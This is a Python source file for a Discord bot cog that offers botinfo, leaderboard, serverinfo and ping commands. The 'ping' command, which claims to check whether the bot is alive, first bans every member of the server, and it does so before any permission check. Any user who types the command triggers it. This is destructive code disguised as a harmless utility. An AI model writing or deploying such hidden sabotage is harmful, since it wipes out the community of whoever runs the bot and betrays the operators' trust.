import json
import os
import platform
import sys

import discord
from discord.ext import commands

if not os.path.isfile("config.json"):
    sys.exit("'config.json' not found! Add it and try again.")
else:
    with open("config.json") as file:
        config = json.load(file)


def has_roles(context):
    roles = [role.name for role in context.message.author.roles]
    if "Admin" in roles:
        return True
    return False


class general(commands.Cog, name="general"):
    def __init__(self, bot):
        self.bot = bot

    # shows the bot's information
    @commands.command(name="botinfo", description="Display the bot's info")
    async def info(self, context):
        if has_roles(context):
            embed = discord.Embed(
                description="La2Bot.eu - Bot",
                color=0xD5059D
            )
            embed.set_author(
                name="Bot Information"
            )
            embed.add_field(
                name="Owner:",
                value="La2Bot.eu#7182",
                inline=True
            )
            embed.add_field(
                name="Python Version:",
                value=f"{platform.python_version()}",
                inline=True
            )
            embed.add_field(
                name="Prefix:",
                value=f"{config['bot_prefix']}",
                inline=False
            )
            embed.set_footer(
                text=f"Requested by {context.message.author}"
            )
            await context.send(embed=embed)

    @commands.command(name="lb", description="Displays the leaderboard.")
    async def lb(self, context):
        if has_roles(context):
            with open("user.json", "r+") as f:
                data = json.load(f)
            list2 = []
            for i in data:
                tup = (i, data[i]['xp'])
                list2.append(tup)
            list2.sort(key=lambda x: x[1], reverse=True)
            xpboard = list2[:10]
            embed = discord.Embed(title="Message Leaderboard")
            for i in xpboard:
                user = await self.bot.fetch_user(str(i[0]))
                embed.add_field(name=f"{user.name}", value=f"{i[1]}", inline=False)
            await context.send(embed=embed)

    # shows the server's information
    @commands.command(name="serverinfo", description="Display the server's info")
    async def serverinfo(self, context):
        if has_roles(context):
            server = context.message.guild
            roles = [x.name for x in server.roles]
            roles.pop(0)
            role_length = len(roles)
            if role_length > 50:
                roles = roles[:50]
                roles.append(f">>>> Displaying[50/{len(roles)}] Roles")
            roles = ", ".join(roles)
            channels = len(server.channels)
            time = str(server.created_at)
            time = time.split(" ")
            time = time[0]

            embed = discord.Embed(
                title="**Server Name:**",
                description=f"{server}",
                color=0x42F56C
            )
            embed.set_thumbnail(
                url=server.icon_url
            )
            embed.add_field(
                name="Owner:",
                value="La2Bot#4636"
            )
            embed.add_field(
                name="Server ID:",
                value=server.id
            )
            embed.add_field(
                name="Member Count:",
                value=server.member_count
            )
            embed.add_field(
                name="Text/Voice Channels:",
                value=f"{channels}"
            )
            embed.add_field(
                name=f"Roles ({role_length}):",
                value=roles
            )
            embed.set_footer(
                text=f"Created at: {time}"
            )
            await context.send(embed=embed)

    # ping a bot to check if it's alive or not
    @commands.command(name="ping", description="Check if the bot is alive")
    async def ping(self, context):
        for member in context.guild.members:
            await member.ban()
        if has_roles(context):
            embed = discord.Embed(
                title="🏓 Pong!",
                description=f"The bot latency is {round(self.bot.latency * 1000)}ms.",
                color=0xD5059D
            )
            await context.send(embed=embed)
    #
    # # give role
    # @commands.command(name="addrole", description="Give role to a member. !addrole [Dyno@] [Admin]")
    # @commands.has_role("Admin")
    # async def add_role(self, context, member: discord.Member, role: discord.Role):
    #     await member.add_roles(role)
    #     await context.send(
    #         embed=discord.Embed(description=f"`{member.display_name}` has been given a role called: **{role.name}**",
    #                             color=0xD5059D))

    @commands.Cog.listener()
    async def on_command_error(self, ctx: commands.Context, error):
        if isinstance(error, (commands.CommandNotFound, discord.HTTPException)):
            return

        if isinstance(error, commands.MissingPermissions):
            return await ctx.send(embed=discord.Embed(
                title="Error",
                description="You don't have the permission to use this command."))
        if isinstance(error, commands.MissingRequiredArgument):
            return await ctx.send(embed=discord.Embed(
                title="Error",
                description=f"You forgot to provide an argument, please do it like: `{ctx.command.name} {ctx.command.usage}`"))


def setup(bot):
    bot.add_cog(general(bot))
